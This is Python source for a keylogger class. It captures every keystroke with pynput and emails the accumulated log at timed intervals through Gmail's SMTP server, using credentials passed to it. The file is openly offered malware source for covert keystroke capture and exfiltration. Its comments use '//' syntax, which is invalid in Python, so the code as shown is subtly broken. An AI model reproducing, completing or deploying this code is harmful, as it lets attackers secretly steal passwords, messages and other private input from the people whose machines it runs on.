//importing all the required libraries  

import smtplib 

import threading 

from pynput import keyboard 

 

class KeyLogger:                  

    def __init__(self, time_interval, email, password): 

        self.interval = time_interval 

        self.log = "KeyLogger has started..." 

        self.email = email 

        self.password = password 

 

    //defining the append function 

    def append_to_log(self, string): 

        self.log = self.log + string 

 

  //defining the recording function 

    def on_press(self, key): 

        try: 

            current_key = str(key.char) 

        except AttributeError: 

            if key == key.space: 

                current_key = " " 

            elif key == key.esc: 

                print("Exiting program...") 

                return False 

            else: 

                current_key = " " + str(key) + " " 

 

        self.append_to_log(current_key) 

 

//defining a function to establish a connection with Gmail servers and send mail 

    def send_mail(self, email, password, message): 

        server = smtplib.SMTP('smtp.gmail.com', 587) 

        server.starttls() 

        server.login(email, password) 

        server.sendmail(email, email, message) 

        server.quit() 

 

//Defining a function to send mails to ourself 

    def report(self): 

        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log) 

        self.log = "" 

        timer = threading.Timer(self.interval, self.report) 

        timer.start() 

//defining a function to start all the processes 

    def commence(self): 

        keyboard_listener = keyboard.Listener(on_press = self.on_press) 

        with keyboard_listener: 

            self.report() 

            keyboard_listener.join() 
